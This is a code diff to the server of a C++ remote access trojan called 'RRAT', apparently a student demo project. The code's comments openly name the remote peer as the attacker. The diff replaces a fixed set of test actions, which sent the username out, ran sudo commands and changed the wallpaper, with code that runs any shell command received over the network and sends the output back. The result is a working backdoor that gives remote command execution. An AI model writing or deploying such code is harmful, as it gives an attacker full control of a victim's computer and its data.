@@ -56,8 +56,6 @@ ENetHost* server;
 // Function Prototypes
 std::string runLinuxCommand(const std::string cmd);
 
-void runCommand(uint8_t command);
-
 void BroadcastPacket(const char* data);
 bool rratReceive(ENetPacket* packet);
 
@@ -118,6 +116,7 @@ int main() {
                 case ENET_EVENT_TYPE_DISCONNECT:
                     // The attacker left
                     std::cout << "The Attacker left\n";
+                    BroadcastPacket("EMERGENCY!! USER DEATH INMINENT!");
                     event.peer->data = NULL;
                     break;
 
@@ -154,10 +153,11 @@ bool rratReceive(ENetPacket* packet) {
 
     // If it's not ogey, process it normally,
     // it's a command
-    uint8_t command = *packet->data;
 
-    std::cout << "We received a command! Command ID: " << std::to_string(command) << "\n";
-    runCommand(command);
+    std::cout << "We received a command!\n";
+    
+    std::string output = runLinuxCommand(msg);
+    BroadcastPacket(output.c_str());
 
     return false;
 }
@@ -178,59 +178,4 @@ std::string runLinuxCommand(const std::string cmd) {
     }
     pclose(pipe);
     return result;
-}
-
-// Execute a RRAT Command
-void runCommand(uint8_t command) {
-    switch (command) {
-        // [TEST] Send my username to atacker (commands work)
-        case 1:
-            {
-                std::string username = runLinuxCommand("echo $USER");
-                std::cout << username << "\n";
-
-                // send username to client
-                BroadcastPacket(username.c_str());
-            }
-            break;
-
-        // [TEST] Create foo.bar in root directory (root only commands work)
-        case 2:
-            {
-                // Create file
-                runLinuxCommand("sudo touch /foo.bar");
-
-                // check if file exists
-                std::string output = runLinuxCommand("ls -l /");
-
-                // send output to client
-                BroadcastPacket(output.c_str());
-            }
-            break;
-        
-        // Play a sound
-        case 3:
-            // Broadcast before playing because it pauses the thread
-            BroadcastPacket("Playing a vine boom on remote computer lmfao");
-            runLinuxCommand("nohup ffplay -v 0 -nodisp -autoexit ~/Music/vineboom.mp3 &");
-            break;
-
-        // Opens the presentation using the default browser
-        case 4:
-            runLinuxCommand("xdg-open https://jsanzucam.github.io/rrat-presentation/");
-            BroadcastPacket("This is still a work in progress...");
-            break;
-
-        case 5:
-            // Specific to my hyprland configuration but it looks
-            // impressive during a presentation lol
-            runLinuxCommand("swww img \"/home/a31nesta/Pictures/ysbag.png\"");
-            BroadcastPacket("Wallpaper set on remote computer");
-            break;
-
-        // No command / Invalid Command:
-        default:
-            std::cout << "Command ID not bound to an action. CID=" << std::to_string(command) << "\n";
-            break;
-    }
 }
